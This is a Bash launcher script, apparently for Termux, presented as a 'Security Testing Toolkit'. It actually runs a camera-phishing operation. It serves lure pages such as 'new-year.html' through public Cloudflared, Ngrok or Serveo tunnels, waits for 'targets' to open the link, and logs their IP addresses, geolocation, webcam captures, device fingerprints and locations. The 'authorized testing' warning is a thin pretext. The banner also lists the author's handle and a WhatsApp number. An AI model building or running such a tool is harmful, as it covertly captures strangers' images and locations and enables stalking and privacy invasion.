#!/bin/bash
# Enhanced Security Testing Toolkit
# For authorized security testing only

# Color codes
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m' # No Color

# Script configuration
SCRIPT_VERSION="2.0.0"
SCRIPT_NAME="Security Test Toolkit"
LOG_DIR="security_test_logs"
CONFIG_FILE=".config.cfg"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Trap Ctrl+C
trap 'cleanup_and_exit' INT TERM EXIT

# Function to display animated banner
animate_banner() {
    printf "\033[?25l"  # Hide cursor
    
    local colors=("${RED}" "${YELLOW}" "${GREEN}" "${CYAN}" "${BLUE}" "${PURPLE}")
    local frames=15
    
    for ((frame=0; frame<frames; frame++)); do
        clear
        color=${colors[$((RANDOM % ${#colors[@]}))]}
        
        printf "\n\n"
        printf "${color}    ╔══════════════════════════════════════════════════════════╗${NC}\n"
        printf "${color}    ║                                                          ║${NC}\n"
        printf "${color}    ║      ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗${NC}\n"
        printf "${color}    ║      ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝${NC}\n"
        printf "${color}    ║      ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║   ${NC}\n"
        printf "${color}    ║      ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║   ${NC}\n"
        printf "${color}    ║      ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║   ${NC}\n"
        printf "${color}    ║      ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ${NC}\n"
        printf "${color}    ║                                                          ║${NC}\n"
        printf "${color}    ║              ${WHITE}🔐 SECURITY TESTING TOOLKIT 🔐${color}              ║${NC}\n"
        printf "${color}    ║                      ${WHITE}Version ${SCRIPT_VERSION}${color}                      ║${NC}\n"
        printf "${color}    ╚══════════════════════════════════════════════════════════╝${NC}\n"
        
        sleep 0.1
    done
    
    printf "\033[?25h"  # Show cursor
}

# Function to display main banner
banner() {
    clear
    printf "${NC}\n"
    
    printf "${CYAN}    ${NC}\n"
    printf "${CYAN}                       ${YELLOW}MAIN MENU${CYAN}                                              ${NC}\n"
    printf "${CYAN}    ══════════════════════════════════════════════════════════════════════════════════════════${NC}\n"
    printf "${CYAN}                                                              ${NC}\n"
    printf "${CYAN}      ${GREEN}███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗    ███████╗██╗   ██╗███████╗${CYAN}  ${NC}\n"
    printf "${CYAN}      ${GREEN}██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║    ██╔════╝╚██╗ ██╔╝██╔════ ${CYAN}  ${NC}\n"
    printf "${CYAN}      ${GREEN}███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║    █████╗   ╚████╔╝ █████╗  ${CYAN}  ${NC}\n"
    printf "${CYAN}      ${GREEN}╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║    ██╔══╝    ╚██╔╝  ██╔══╝  ${CYAN}  ${NC}\n"
    printf "${CYAN}      ${GREEN}███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝    ███████╗   ██║   ███████╗${CYAN}  ${NC}\n"
    printf "${CYAN}      ${GREEN}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝     ╚══════╝   ╚═╝   ╚══════╝${CYAN}  ${NC}\n"
    printf "${CYAN}                                                                                                       ${NC}\n"
    printf "${CYAN}      ${WHITE}👤 Author: ${YELLOW}ATHEX H4CK3R${CYAN}                                                  ${NC}\n"
    printf "${CYAN}      ${WHITE}📱 WhatsApp: ${YELLOW}+92 3490916663${CYAN}                                               ${NC}\n"
    printf "${CYAN}      ${WHITE}🔧 Version: ${GREEN}${SCRIPT_VERSION}${CYAN}                                             ${NC}\n"
    printf "${CYAN}      ${WHITE}📊 Log Directory: ${PURPLE}${LOG_DIR}${CYAN}                                             ${NC}\n"
    printf "${CYAN}    ══════════════════════════════════════════════════════════════════════════════════════════════${NC}\n"
    printf "${CYAN}      ${RED}⚠  WARNING: For authorized testing only!                                       ${CYAN}${NC}\n"
    printf "${CYAN}      ${RED}⚠  Ensure you have permission before testing!                                  ${CYAN}${NC}\n"
    printf "${CYAN}    ${NC}\n"
    
    printf "\n"
}

# Function to show loading animation
loading() {
    local message="$1"
    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
    local i=0
    
    printf "    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}${message}${NC} "
    
    while [ $i -lt 10 ]; do
        printf "\b${spin:$((i % 8)):1}"
        sleep 0.1
        ((i++))
    done
    
    printf "\b${GREEN}✓${NC}\n"
}

# Function to show progress bar
progress_bar() {
    local duration=$1
    local message=$2
    local width=50
    local step=$((duration * 10))
    
    printf "    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}${message}${NC}\n"
    printf "    ${CYAN}[${NC}"
    
    for ((i=0; i<=width; i++)); do
        printf "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
        printf "    ${CYAN}[${NC}"
        
        local percent=$((i * 100 / width))
        local filled=$((i * width / 100))
        
        for ((j=0; j<filled; j++)); do
            printf "${GREEN}▓${NC}"
        done
        
        for ((j=filled; j<width; j++)); do
            printf "${WHITE}░${NC}"
        done
        
        printf "${CYAN}] ${GREEN}%d%%${NC}" "$percent"
        
        sleep 0.0$((step / width))
    done
    
    printf "\n"
}

# Function to check and install dependencies
dependencies() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Checking dependencies...${NC}\n"
    
    # Create log directory
    if [[ ! -d "$LOG_DIR" ]]; then
        mkdir -p "$LOG_DIR"
        mkdir -p "$LOG_DIR"/{ip_info,device_info,location,sessions,images,analytics}
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Created log directory structure${NC}\n"
    fi
    
    # Check PHP
    if command -v php > /dev/null 2>&1; then
        PHP_VERSION=$(php -v | head -n1 | cut -d' ' -f2)
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}PHP ${PHP_VERSION} is installed${NC}\n"
    else
        printf "    ${CYAN}[${RED}✗${CYAN}] ${RED}PHP is not installed!${NC}\n"
        progress_bar 10 "Installing PHP"
        pkg install php -y > /dev/null 2>&1
    fi

    # Check Cloudflared
    if command -v cloudflared > /dev/null 2>&1; then
        CLOUD_VERSION=$(cloudflared --version | head -n1 | cut -d' ' -f3)
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Cloudflared ${CLOUD_VERSION} is installed${NC}\n"
    else
        printf "    ${CYAN}[${RED}✗${CYAN}] ${RED}Cloudflared is not installed!${NC}\n"
        progress_bar 15 "Installing Cloudflared"
        pkg install cloudflared -y > /dev/null 2>&1
    fi

    # Check wget
    if command -v wget > /dev/null 2>&1; then
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Wget is installed${NC}\n"
    else
        loading "Installing Wget"
        pkg install wget -y > /dev/null 2>&1
    fi

    # Check unzip
    if command -v unzip > /dev/null 2>&1; then
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Unzip is installed${NC}\n"
    else
        loading "Installing Unzip"
        pkg install unzip -y > /dev/null 2>&1
    fi

    # Check jq for JSON parsing
    if command -v jq > /dev/null 2>&1; then
        printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}jq is installed${NC}\n"
    else
        loading "Installing jq"
        pkg install jq -y > /dev/null 2>&1
    fi

    printf "\n    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}All dependencies satisfied!${NC}\n"
}

# Enhanced cleanup function
cleanup_and_exit() {
    printf "\n\n    ${CYAN}[${RED}•${CYAN}] ${YELLOW}Cleaning up processes...${NC}\n"
    
    # Kill all running processes
    local processes=("php" "ngrok" "cloudflared" "ssh" "python")
    
    for proc in "${processes[@]}"; do
        if pgrep -f "$proc" > /dev/null; then
            pkill -f "$proc"
            printf "    ${CYAN}[${RED}✗${CYAN}] ${RED}Stopped ${proc}${NC}\n"
            sleep 0.5
        fi
    done
    
    # Remove temporary files
    rm -f sendlink .cld.log ip.txt Log.log 2>/dev/null
    
    # Save session log
    local session_log="$LOG_DIR/sessions/session_$TIMESTAMP.log"
    echo "Session ended at $(date)" > "$session_log"
    
    printf "\n    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Cleanup complete!${NC}\n"
    printf "    ${CYAN}[${YELLOW}📁${CYAN}] ${WHITE}Logs saved in: ${PURPLE}${LOG_DIR}${NC}\n"
    sleep 1
    exit 0
}

# Function to capture and display target info
catch_ip() {
    if [[ -f "ip.txt" ]]; then
        local ip_data=$(cat ip.txt)
        
        # Parse IP info
        local ip=$(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' ip.txt | head -n1)
        
        printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        printf "    ${GREEN}🎯 TARGET INFORMATION CAPTURED!${NC}\n"
        printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        
        # Get geolocation if possible
        if [[ -n "$ip" ]]; then
            geo_info=$(curl -s "http://ip-api.com/json/$ip")
            country=$(echo "$geo_info" | jq -r '.country' 2>/dev/null)
            city=$(echo "$geo_info" | jq -r '.city' 2>/dev/null)
            isp=$(echo "$geo_info" | jq -r '.isp' 2>/dev/null)
            
            printf "    ${WHITE}📌 IP Address: ${GREEN}%s${NC}\n" "$ip"
            printf "    ${WHITE}🌍 Location:    ${YELLOW}%s, %s${NC}\n" "$city" "$country"
            printf "    ${WHITE}🏢 ISP:         ${PURPLE}%s${NC}\n" "$isp"
        fi
        
        printf "    ${WHITE}⏰ Time:        ${CYAN}%s${NC}\n" "$(date)"
        printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        
        # Save to master log
        cat ip.txt >> "$LOG_DIR/ip_info/collected_ips.txt"
        rm -f ip.txt
    fi
}

# Function to check for targets
checkfound() {
    printf "\n    ${CYAN}[${YELLOW}*${CYAN}] ${WHITE}Waiting for targets...${NC}\n"
    printf "    ${CYAN}[${RED}!${CYAN}] ${YELLOW}Press Ctrl+C to stop${NC}\n\n"
    
    local anim=0
    local spin='◐◓◑◒'
    
    while true; do
        # Check for IP capture
        if [[ -f "ip.txt" ]]; then
            printf "\r    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Target visited!${NC}                    \n"
            catch_ip
            printf "\n    ${CYAN}[${YELLOW}*${CYAN}] ${WHITE}Still waiting for more targets...${NC}\n"
        fi

        # Check for camera capture
        if [[ -f "Log.log" ]]; then
            printf "\r    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Camera access granted!${NC}            \n"
            local capture_count=$(grep -c "Received" Log.log)
            printf "    ${WHITE}📸 Captures: ${YELLOW}%d${NC}\n" "$capture_count"
            
            # Move to logs
            mv Log.log "$LOG_DIR/images/log_$TIMESTAMP.log" 2>/dev/null
        fi
        
        # Check for device info
        if [[ -f "$LOG_DIR/device_info/latest.json" ]]; then
            printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Device info collected!${NC}\n"
        fi
        
        # Animated waiting indicator
        printf "\r    ${CYAN}[${YELLOW}%s${CYAN}] ${WHITE}Monitoring %s${NC}" \
               "${spin:$((anim % 4)):1}" \
               "$(printf '.%.0s' $((anim % 4)))"
        
        ((anim++))
        sleep 0.5
    done
}

# Enhanced Serveo server
serveo_server() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Setting up Serveo tunnel...${NC}\n"
    
    # Kill existing PHP processes
    pkill -f php > /dev/null 2>&1
    
    # Start PHP server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    local php_pid=$!
    sleep 3
    
    if [[ $subdomain_resp == true ]]; then
        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
            -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1 &
    else
        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
            -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    fi
    
    local ssh_pid=$!
    sleep 8
    
    # Extract link
    send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    
    if [[ -z "$send_link" ]]; then
        send_link=$(grep -o "http://[0-9a-z]*\.serveo.net" sendlink)
    fi
    
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}🔗 SERVEO TUNNEL ACTIVE${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}📎 URL: ${YELLOW}%s${NC}\n" "$send_link"
    printf "    ${WHITE}📱 PHP PID: ${GREEN}%d${NC}\n" "$php_pid"
    printf "    ${WHITE}🔌 SSH PID: ${GREEN}%d${NC}\n" "$ssh_pid"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Update HTML files
    sed -i "s+forwarding_link+${send_link}+g" new-year.html 2>/dev/null
    sed -i "s+forwarding_link+${send_link}+g" index2.html 2>/dev/null
    sed -i "s+forwarding_link+${send_link}+g" template.php 2>/dev/null
    
    # Log the link
    echo "$(date) - Serveo: $send_link" >> "$LOG_DIR/analytics/links.log"
}

# Enhanced Ngrok server
ngrok_server() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Setting up Ngrok tunnel...${NC}\n"
    
    # Check if ngrok exists
    if [[ ! -f "ngrok" ]]; then
        progress_bar 20 "Downloading Ngrok"
        
        local arch=$(uname -m)
        if [[ "$arch" == "aarch64" ]] || [[ "$arch" == "armv8l" ]]; then
            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
            tar -xf ngrok-v3-stable-linux-arm64.tgz
        elif [[ "$arch" == "arm"* ]]; then
            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz
            tar -xf ngrok-v3-stable-linux-arm.tgz
        else
            wget -q --show-progress https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz
            tar -xf ngrok-v3-stable-linux-386.tgz
        fi
        
        chmod +x ngrok
    fi
    
    # Start PHP server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    local php_pid=$!
    sleep 3
    
    # Start ngrok
    ./ngrok http 3333 --log=stdout > ngrok.log 2>&1 &
    local ngrok_pid=$!
    sleep 5
    
    # Get ngrok URL
    local retry=0
    while [[ $retry -lt 10 ]]; do
        send_link=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url' 2>/dev/null)
        if [[ -n "$send_link" ]] && [[ "$send_link" != "null" ]]; then
            break
        fi
        sleep 2
        ((retry++))
    done
    
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}🌐 NGROK TUNNEL ACTIVE${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}📎 URL: ${YELLOW}%s${NC}\n" "$send_link"
    printf "    ${WHITE}📱 PHP PID: ${GREEN}%d${NC}\n" "$php_pid"
    printf "    ${WHITE}🔌 Ngrok PID: ${GREEN}%d${NC}\n" "$ngrok_pid"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Update HTML files
    sed -i "s+forwarding_link+${send_link}+g" new-year.html 2>/dev/null
    sed -i "s+forwarding_link+${send_link}+g" index2.html 2>/dev/null
    
    # Log the link
    echo "$(date) - Ngrok: $send_link" >> "$LOG_DIR/analytics/links.log"
}

# Enhanced Cloudflared server
cloudflared_server() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Setting up Cloudflared tunnel...${NC}\n"
    
    # Kill existing processes
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f php > /dev/null 2>&1
    
    # Start PHP server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    local php_pid=$!
    sleep 3
    
    # Start cloudflared
    cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
    local cld_pid=$!
    
    # Wait for tunnel to establish
    local retry=0
    while [[ $retry -lt 15 ]]; do
        send_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' .cld.log | head -n1)
        if [[ -n "$send_link" ]]; then
            break
        fi
        sleep 2
        ((retry++))
    done
    
    if [[ -z "$send_link" ]]; then
        send_link=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | jq -r '.tunnels[0].public_url' 2>/dev/null)
    fi
    
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}☁️ CLOUDFLARED TUNNEL ACTIVE${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}📎 URL: ${YELLOW}%s${NC}\n" "$send_link"
    printf "    ${WHITE}📱 PHP PID: ${GREEN}%d${NC}\n" "$php_pid"
    printf "    ${WHITE}🔌 Cloudflared PID: ${GREEN}%d${NC}\n" "$cld_pid"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Update HTML files
    sed -i "s+forwarding_link+${send_link}+g" new-year.html 2>/dev/null
    sed -i "s+forwarding_link+${send_link}+g" index2.html 2>/dev/null
    sed -i "s+forwarding_link+${send_link}+g" template.php 2>/dev/null
    
    # Log the link
    echo "$(date) - Cloudflared: $send_link" >> "$LOG_DIR/analytics/links.log"
    
    # Start monitoring
    checkfound
}

# Function to show server selection menu
server_selection() {
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}🎪 TUNNELING METHOD SELECTION${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}  ${GREEN}[1]${WHITE} Cloudflared  ${CYAN}(Fastest & Most Reliable)${NC}\n"
    printf "    ${WHITE}  ${GREEN}[2]${WHITE} Ngrok        ${CYAN}(Good for compatibility)${NC}\n"
    printf "    ${WHITE}  ${GREEN}[3]${WHITE} Serveo.net   ${CYAN}(Custom subdomain support)${NC}\n"
    printf "    ${WHITE}  ${GREEN}[4]${WHITE} Localhost    ${CYAN}(No tunnel, local only)${NC}\n"
    printf "    ${WHITE}  ${GREEN}[5]${WHITE} All Methods  ${CYAN}(Start all tunnels)${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    printf "\n    ${WHITE}📝 Select option [${GREEN}1${WHITE}/${GREEN}2${WHITE}/${GREEN}3${WHITE}/${GREEN}4${WHITE}/${GREEN}5${WHITE}]: ${NC}"
    read -r option
    
    case $option in
        1) cloudflared_server ;;
        2) ngrok_server ;;
        3) serveo_subdomain_menu ;;
        4) local_server ;;
        5) start_all_tunnels ;;
        *) 
            printf "    ${RED}Invalid option! Using Cloudflared...${NC}\n"
            sleep 1
            cloudflared_server ;;
    esac
}

# Function for Serveo subdomain menu
serveo_subdomain_menu() {
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}🔧 SERVEO CUSTOM SUBDOMAIN${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    printf "\n    ${WHITE}📝 Use custom subdomain? [${GREEN}Y${WHITE}/${RED}n${WHITE}]: ${NC}"
    read -r use_custom
    
    if [[ "$use_custom" =~ ^[Yy]$ ]]; then
        printf "    ${WHITE}📝 Enter subdomain: ${NC}"
        read -r subdomain
        subdomain_resp=true
    else
        subdomain_resp=false
    fi
    
    serveo_server
}

# Function for local server only
local_server() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Starting local server on port 3333...${NC}\n"
    
    pkill -f php > /dev/null 2>&1
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    local php_pid=$!
    
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}💻 LOCAL SERVER ACTIVE${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}📎 URL: ${YELLOW}http://localhost:3333${NC}\n"
    printf "    ${WHITE}📱 Network URL: ${YELLOW}http://$(hostname -I 2>/dev/null | awk '{print $1}'):3333${NC}\n"
    printf "    ${WHITE}📱 PHP PID: ${GREEN}%d${NC}\n" "$php_pid"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Log the info
    echo "$(date) - Local server started on port 3333" >> "$LOG_DIR/analytics/links.log"
    
    checkfound
}

# Function to start all tunnels (for testing)
start_all_tunnels() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Starting all tunneling methods...${NC}\n"
    
    # Start local server
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    
    # Start each tunnel in background
    cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
    ./ngrok http 3333 --log=stdout > ngrok.log 2>&1 &
    ssh -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    
    sleep 10
    
    # Get all URLs
    cld_link=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' .cld.log | head -n1)
    ngrok_link=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url' 2>/dev/null)
    serveo_link=$(grep -o 'https://[0-9a-z]*\.serveo.net' sendlink)
    
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}🚀 ALL TUNNELS ACTIVE${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${WHITE}☁️  Cloudflared: ${YELLOW}%s${NC}\n" "$cld_link"
    printf "    ${WHITE}🌐 Ngrok:       ${YELLOW}%s${NC}\n" "$ngrok_link"
    printf "    ${WHITE}🔗 Serveo:      ${YELLOW}%s${NC}\n" "$serveo_link"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Log all links
    {
        echo "$(date) - Cloudflared: $cld_link"
        echo "$(date) - Ngrok: $ngrok_link"
        echo "$(date) - Serveo: $serveo_link"
    } >> "$LOG_DIR/analytics/links.log"
    
    checkfound
}

# Function to show statistics
show_stats() {
    printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    printf "    ${GREEN}📊 COLLECTION STATISTICS${NC}\n"
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    # Count collected data
    ip_count=$(find "$LOG_DIR/ip_info" -name "*.txt" 2>/dev/null | wc -l)
    image_count=$(find "$LOG_DIR/images" -name "*.jpg" 2>/dev/null | wc -l)
    device_count=$(find "$LOG_DIR/device_info" -name "*.json" 2>/dev/null | wc -l)
    location_count=$(find "$LOG_DIR/location" -name "*.json" 2>/dev/null | wc -l)
    
    printf "    ${WHITE}📌 IP Addresses:   ${GREEN}%d${NC}\n" "$ip_count"
    printf "    ${WHITE}📸 Images:         ${GREEN}%d${NC}\n" "$image_count"
    printf "    ${WHITE}📱 Device Fingerprints: ${GREEN}%d${NC}\n" "$device_count"
    printf "    ${WHITE}📍 Locations:      ${GREEN}%d${NC}\n" "$location_count"
    
    # Calculate total size
    total_size=$(du -sh "$LOG_DIR" 2>/dev/null | cut -f1)
    printf "    ${WHITE}💾 Total Size:     ${YELLOW}%s${NC}\n" "$total_size"
    
    printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
    
    printf "\n    ${WHITE}Press Enter to continue...${NC}"
    read -r
}

# Function to show main menu
main_menu() {
    while true; do
        banner
        
        printf "\n    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        printf "    ${GREEN}🎯 MAIN MENU${NC}\n"
        printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        printf "    ${WHITE}  ${GREEN}[1]${WHITE} Start Server/Tunneling${NC}\n"
        printf "    ${WHITE}  ${GREEN}[2]${WHITE} View Statistics${NC}\n"
        printf "    ${WHITE}  ${GREEN}[3]${WHITE} Clean Logs${NC}\n"
        printf "    ${WHITE}  ${GREEN}[4]${WHITE} Generate Report${NC}\n"
        printf "    ${WHITE}  ${GREEN}[5]${WHITE} Exit${NC}\n"
        printf "    ${CYAN}══════════════════════════════════════════════════════════${NC}\n"
        
        printf "\n    ${WHITE}📝 Select option: ${NC}"
        read -r main_option
        
        case $main_option in
            1) server_selection ;;
            2) show_stats ;;
            3) clean_logs ;;
            4) generate_report ;;
            5) cleanup_and_exit ;;
            *) 
                printf "    ${RED}Invalid option!${NC}\n"
                sleep 1 ;;
        esac
    done
}

# Function to clean old logs
clean_logs() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Cleaning old logs...${NC}\n"
    
    # Ask for days to keep
    printf "    ${WHITE}📝 Keep logs from last [30] days: ${NC}"
    read -r days
    days=${days:-30}
    
    # Find and delete old files
    find "$LOG_DIR" -type f -mtime +$days -delete 2>/dev/null
    
    printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Cleaned logs older than $days days${NC}\n"
    sleep 2
}

# Function to generate HTML report
generate_report() {
    printf "\n    ${CYAN}[${YELLOW}•${CYAN}] ${WHITE}Generating HTML report...${NC}\n"
    
    local report_file="$LOG_DIR/analytics/report_$TIMESTAMP.html"
    
    # Count data
    local ip_count=$(find "$LOG_DIR/ip_info" -name "*.txt" 2>/dev/null | wc -l)
    local image_count=$(find "$LOG_DIR/images" -name "*.jpg" 2>/dev/null | wc -l)
    local device_count=$(find "$LOG_DIR/device_info" -name "*.json" 2>/dev/null | wc -l)
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Security Test Report</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
        h1 { color: #00ff00; border-bottom: 2px solid #00ff00; }
        h2 { color: #ffd700; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
        .stat-box { background: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 3px solid #00ff00; }
        .stat-number { font-size: 2em; color: #00ff00; }
        .stat-label { color: #888; }
        .timestamp { color: #666; text-align: right; margin-top: 30px; }
    </style>
</head>
<body>
    <h1>🔐 Security Test Report</h1>
    <p>Generated: $(date)</p>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number">$ip_count</div>
            <div class="stat-label">IP Addresses</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">$image_count</div>
            <div class="stat-label">Images Captured</div>
        </div>
        <div class="stat-box">
            <div class="stat-number">$device_count</div>
            <div class="stat-label">Device Fingerprints</div>
        </div>
    </div>
    
    <h2>Recent Activity</h2>
    <pre>$(tail -n 20 "$LOG_DIR/analytics/links.log" 2>/dev/null)</pre>
    
    <div class="timestamp">Report ID: $TIMESTAMP</div>
</body>
</html>
EOF
    
    printf "    ${CYAN}[${GREEN}✓${CYAN}] ${GREEN}Report generated: ${YELLOW}%s${NC}\n" "$report_file"
    sleep 2
}

# Main execution
clear
animate_banner
sleep 1

# Check if running in Termux
if [[ -d "/data/data/com.termux" ]]; then
    # Setup storage if needed
    if [[ ! -d ~/storage ]]; then
        termux-setup-storage
    fi
fi

# Create necessary directories
mkdir -p "$LOG_DIR"/{ip_info,device_info,location,sessions,images,analytics}
chmod 755 "$LOG_DIR"

# Check dependencies
dependencies
sleep 1

# Show main menu
main_menu